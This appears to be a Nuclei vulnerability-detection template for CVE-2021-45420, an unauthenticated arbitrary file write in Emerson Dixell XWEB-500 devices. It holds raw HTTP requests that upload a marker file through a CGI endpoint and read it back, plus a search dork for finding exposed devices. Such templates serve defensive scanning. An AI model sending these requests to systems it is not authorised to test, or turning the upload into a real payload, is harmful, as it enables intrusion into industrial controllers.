http:
- matchers:
  - dsl:
    - contains(body_2, "dixell-xweb500-filewrite")
    type: dsl
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /cgi-bin/logo_extra_upload.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/octet-stream


    {{randstr}}.txt

    dixell-xweb500-filewrite

    '
  - 'GET /logo/{{randstr}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-45420
info:
  author: hackerarpan
  classification:
    cpe: cpe:2.3:h:emerson:dixell_xweb-500:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-45420
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-200
    epss-percentile: 0.98994
    epss-score: 0.78704
  description: 'Emerson Dixell XWEB-500 contains an arbitrary file write caused by
    unauthenticated access to /cgi-bin/logo_extra_upload.cgi, /cgi-bin/cal_save.cgi,
    and /cgi-bin/lo_utils.cgi, letting attackers write any file on the system, exploit
    requires no authentication.

    '
  impact: 'Unauthenticated attackers can write arbitrary files to any location on
    the Dixell XWEB-500 server, potentially uploading malicious CGI scripts or modifying
    system files.

    '
  metadata:
    google-query: inurl:"xweb500.cgi"
    max-request: 2
    product: dixell_xweb-500
    vendor: emerson
  name: Emerson Dixell XWEB-500 - Arbitrary File Write
  reference:
  - https://www.exploit-db.com/exploits/50639
  - https://www.swascan.com/emerson
  - https://nvd.nist.gov/vuln/detail/CVE-2021-45420
  remediation: 'Apply firmware updates provided by Emerson Dixell or restrict network
    access to the device.

    '
  severity: critical
  tags: cve,cve2021,lfw,iot,dixell,xweb500,edb,fileupload,intrusive,vkev,vuln
